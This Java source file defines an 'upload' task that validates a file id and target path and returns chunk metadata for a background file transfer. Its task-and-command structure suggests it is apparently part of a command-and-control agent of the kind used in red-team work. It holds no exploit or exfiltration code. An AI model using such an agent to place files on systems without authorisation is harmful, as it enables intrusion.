package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

/**
 * Upload file task - handles initial validation and metadata
 * Actual file transfer is handled by UploadBackgroundTask
 */
public class UploadTask implements Task {
    
    public static final int CHUNK_SIZE = 512000; // 512KB chunks
    private final ObjectMapper objectMapper = new ObjectMapper();
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        // Extract parameters
        String fileId = parameters.has("file") ? parameters.get("file").asText() : "";
        String remotePath = parameters.has("remote_path") ? parameters.get("remote_path").asText() : "";
        String fileName = parameters.has("file_name") ? parameters.get("file_name").asText() : "";
        String host = parameters.has("host") ? parameters.get("host").asText() : "";
        
        Config.debugLog(config, "Upload request - remote_path: '" + remotePath + "', file_name: '" + fileName + "', file_id: '" + fileId + "', host: '" + host + "'");
        
        if (fileId.isEmpty()) {
            throw new Exception("file_id is required");
        }
        
        if (remotePath.isEmpty()) {
            throw new Exception("remote_path is required");
        }
        
        // Resolve path
        Path filePath = Paths.get(remotePath);
        Config.debugLog(config, "Initial path object: " + filePath);
        
        if (!filePath.isAbsolute()) {
            String cwd = System.getProperty("user.dir");
            filePath = Paths.get(cwd).resolve(remotePath);
            Config.debugLog(config, "Resolved relative to CWD (" + cwd + "): " + filePath);
        }
        
        // Check if file already exists
        if (Files.exists(filePath)) {
            throw new Exception("Remote path already exists: " + filePath.toAbsolutePath());
        }
        
        // Get absolute path for tracking
        String fullPath = filePath.toAbsolutePath().toString();
        Config.debugLog(config, "Upload will write to: " + fullPath);
        
        // Create upload initiation response
        Map<String, Object> uploadResponse = new HashMap<>();
        uploadResponse.put("chunk_size", CHUNK_SIZE);
        uploadResponse.put("file_id", fileId);
        uploadResponse.put("chunk_num", 1);
        uploadResponse.put("full_path", fullPath);
        
        // Return as JSON with "upload" key to trigger background upload
        Map<String, Object> result = new HashMap<>();
        result.put("upload", uploadResponse);
        
        return objectMapper.writeValueAsString(result);
    }
    
    @Override
    public String getCommandName() {
        return "upload";
    }
}
